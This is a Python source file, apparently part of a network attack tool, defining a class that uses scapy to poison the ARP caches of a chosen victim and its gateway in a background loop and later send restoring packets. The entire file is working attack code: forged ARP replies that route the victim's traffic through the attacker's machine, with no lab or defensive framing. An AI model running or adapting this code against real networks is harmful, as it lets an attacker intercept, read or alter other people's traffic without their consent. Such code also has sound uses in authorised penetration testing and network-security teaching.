import logging
import threading
import time
from typing import Optional

from scapy.all import ARP, send, get_if_hwaddr, getmacbyip  # type: ignore

logger = logging.getLogger(__name__)


class ARPHandler:
    """
    Handles ARP spoofing and restoration.

    - start_spoofing(): begins ARP poisoning loop in a background thread
    - stop_spoofing_and_restore(): stops loop and sends legit ARP packets
    """

    def __init__(self, interface: str, spoof_interval: float = 2.0):
        self.interface = interface
        self.spoof_interval = spoof_interval
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

        logger.info(f"ARPHandler initialized on interface: {self.interface}")

    def start_spoofing(
        self,
        victim_ip: str,
        gateway_ip: str,
        attacker_mac: Optional[str] = None,
        victim_mac: Optional[str] = None,
        gateway_mac: Optional[str] = None,
    ) -> bool:
        """
        Starts ARP spoofing between victim and gateway.
        """

        if self._thread and self._thread.is_alive():
            logger.warning("ARP spoofing already running on this handler.")
            return False

        # Resolve attacker MAC if not provided
        if attacker_mac is None:
            try:
                attacker_mac = get_if_hwaddr(self.interface)
            except Exception as e:
                logger.error(
                    f"Failed to resolve attacker MAC on {self.interface}: {e}",
                    exc_info=True,
                )
                return False

        # Resolve victim/gateway MAC if not provided
        if victim_mac is None:
            victim_mac = getmacbyip(victim_ip)
        if gateway_mac is None:
            gateway_mac = getmacbyip(gateway_ip)

        if not victim_mac or not gateway_mac:
            logger.error(
                f"Could not resolve MAC addresses: "
                f"victim_ip={victim_ip}, victim_mac={victim_mac}, "
                f"gateway_ip={gateway_ip}, gateway_mac={gateway_mac}"
            )
            return False

        logger.info(
            f"Starting ARP spoofing:\n"
            f"  victim  {victim_ip} ({victim_mac})\n"
            f"  gateway {gateway_ip} ({gateway_mac})\n"
            f"  attacker_mac {attacker_mac} on {self.interface}"
        )

        self._stop_event.clear()

        self._thread = threading.Thread(
            target=self._spoof_loop,
            args=(victim_ip, gateway_ip, victim_mac, gateway_mac, attacker_mac),
            daemon=True,
        )
        self._thread.start()
        return True

    def _spoof_loop(
        self,
        victim_ip: str,
        gateway_ip: str,
        victim_mac: str,
        gateway_mac: str,
        attacker_mac: str,
    ):
        """
        Internal loop that repeatedly sends ARP replies to poison caches.
        """
        try:
            while not self._stop_event.is_set():
                pkt_to_victim = ARP(
                    op=2,
                    psrc=gateway_ip,
                    pdst=victim_ip,
                    hwdst=victim_mac,
                    hwsrc=attacker_mac,
                )

                pkt_to_gateway = ARP(
                    op=2,
                    psrc=victim_ip,
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    hwsrc=attacker_mac,
                )

                send(pkt_to_victim, iface=self.interface, verbose=False)
                send(pkt_to_gateway, iface=self.interface, verbose=False)

                logger.debug(
                    f"Sent spoofed ARP: victim={victim_ip}, gateway={gateway_ip}, attacker_mac={attacker_mac}"
                )

                time.sleep(self.spoof_interval)
        except Exception as e:
            logger.error(f"Error in ARP spoofing loop: {e}", exc_info=True)
        finally:
            logger.info("ARP spoofing loop terminated.")

    def stop_spoofing_and_restore(
        self,
        victim_ip: str,
        gateway_ip: str,
        victim_mac: str,
        gateway_mac: str,
        restore_attempts: int = 5,
        restore_delay: float = 0.5,
    ):
        """
        Stops spoofing loop and sends 'legitimate' ARP replies to restore network.
        """

        self._stop_event.set()

        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)

        logger.info(
            f"Restoring ARP tables for victim={victim_ip} ({victim_mac}) "
            f"and gateway={gateway_ip} ({gateway_mac})"
        )

        try:
            real_to_victim = ARP(
                op=2,
                psrc=gateway_ip,
                pdst=victim_ip,
                hwdst=victim_mac,
                hwsrc=gateway_mac,
            )

            real_to_gateway = ARP(
                op=2,
                psrc=victim_ip,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                hwsrc=victim_mac,
            )

            for _ in range(restore_attempts):
                send(real_to_victim, iface=self.interface, verbose=False)
                send(real_to_gateway, iface=self.interface, verbose=False)
                time.sleep(restore_delay)

            logger.info("Sent ARP restoration packets to victim and gateway.")
        except Exception as e:
            logger.error(f"Error while sending ARP restore packets: {e}", exc_info=True)
